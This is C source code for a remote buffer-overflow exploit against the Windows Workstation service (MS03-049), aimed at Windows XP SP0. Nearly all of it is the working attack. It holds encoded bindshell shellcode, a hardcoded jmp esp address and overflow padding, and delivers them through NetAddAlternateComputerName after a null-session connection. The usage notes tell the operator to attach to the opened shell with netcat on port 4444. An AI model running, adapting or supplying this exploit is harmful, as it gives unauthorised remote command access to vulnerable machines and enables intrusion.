/* ms03-049 by wirepair, pretty sweet find, although i can only get this to work on XPsp0. Win2k responds with like
op rng error stating it doesn't know what the hell i'm requesting. Eeye seemed to elude to the fact that 'only xp has these
undocumented api's' or something, anyways sc is from oc.192's awesome rpc exploit. This is beta and the code is friggen disgusting.
It was a hack job basically, but it works and i've tested it on 2 XP no sp machines. I'll add the 'change bindshell port' later.
It shouldn't crash the box either, at least in my cases exitthread does the trick. 
This code proves how little i know about crazy windows string stuff if you see a bunch of crap that makes no sense like weird casting.
It's because I have no idea heh. 
Only works against SP0 at the moment.... working on sp1 heh.
Usage: 
C:\>net use \\ip.ip.ip.ip\IPC$ "" /u:""
C:\>0349 ip.ip.ip.ip
open new cmd: 
C:\>nc ip.ip.ip.ip 4444
*/

#include <windows.h>
#include <winbase.h>
#include <lm.h>
#include "LMJoin.h" //prolly don't need this but what the hey.
#include <winnls.h>
#include <stdio.h>
#include <string.h>

typedef VOID (*MYPROC)(IN  LPCWSTR Server OPTIONAL,
    IN  LPCWSTR AlternateName,
    IN  LPCWSTR DomainAccount OPTIONAL,
    IN  LPCWSTR DomainAccountPassword OPTIONAL,
    IN  ULONG Reserved
    );
int main(int argc, char **argv) {
	char overwrite[2045] = "";
	char sc[] = 
	"\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff"
    "\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2"
    "\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80"
    "\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09"
    "\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6"
    "\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf"
    "\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad"
    "\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\xdd\x5a\x60\xdf\xda\x8a\x81"
    "\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81"
    "\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80"
    "\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80"
    "\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80"
    "\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80"
    "\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80"
    "\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81"
    "\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6"
    "\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3"
    "\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50"
    "\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4"
    "\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4"
    "\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4"
    "\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f"
    "\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b"
    "\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80"
    "\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89"
    "\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80"
    "\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83"
    "\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83"
    "\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78"
    "\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c"
    "\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b"
    "\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04";
	char exp_buf[2045+4+16+501];
	char ip[30];
	LPWSTR ipl[60];
	DWORD jmpesp = 0x7518A747;
	LPWSTR unicode[(2045+4+16+501)*2];
	int i = 0;
	int len = 0;
	HINSTANCE hinstLib; 
    MYPROC ProcAddr; 
    BOOL fFreeResult, fRunTimeLinkSuccess = FALSE; 
	
	
	if (argc < 2) {
		fprintf(stderr, "ms03-049 wkksvc.dll buffer overflow by wirepair.\n");
		fprintf(stderr, "Usage: %s <ip>\n",argv[0]);
		fprintf(stderr, "C:\\>net use \\\\ip.ip.ip.ip\\IPC$ \"\" /u:\"\""\
						"\nC:\\>0349 ip.ip.ip.ip\n"\
						"open new cmd:\n"\
						"C:\\>nc ip.ip.ip.ip 4444\n"\
						"If it doesn't hang the ip's invalid or it did not work\n");
		exit(1);
	}

	printf("Attacking: %s\n",argv[1]);
	
	_snprintf(ip, 24, "\\\\%s", argv[1]); // i should've used vsprintf() >:)
	



	hinstLib = LoadLibrary("netapi32.dll");
	
	memset(overwrite, 0x41, 2000);
	memset(overwrite+2000, 0x90, 44);
	memcpy(exp_buf, overwrite, 2044);
	memcpy(exp_buf+2044, &jmpesp, 4);
	memset(exp_buf+2048, 0x90, 16);
	memcpy(exp_buf+2064, sc, sizeof(sc));

	MultiByteToWideChar(CP_ACP, NULL, ip, 30, (unsigned short*)ipl, 60);
	wprintf(L"\n%s",ipl);
	len = MultiByteToWideChar(CP_ACP, NULL, exp_buf, sizeof(exp_buf), (unsigned short *)unicode,sizeof(unicode));

	
	if (hinstLib != NULL) {
		ProcAddr = (MYPROC) GetProcAddress(hinstLib,"NetAddAlternateComputerName");
		if (NULL != ProcAddr) {
            fRunTimeLinkSuccess = TRUE;	
			printf("\nGetProcAddr: %x\n", *ProcAddr);
			printf("Sending exploit, you should be able to nc to the host\n"); 
			(ProcAddr)((LPCWSTR)ipl,(const unsigned short *)unicode,NULL,NULL,0);
		} else {
			printf("procaddr null\n");
		}
 
        fFreeResult = FreeLibrary(hinstLib); 
    } else {
	printf("hinst null\n");
	}

	return(0);
}

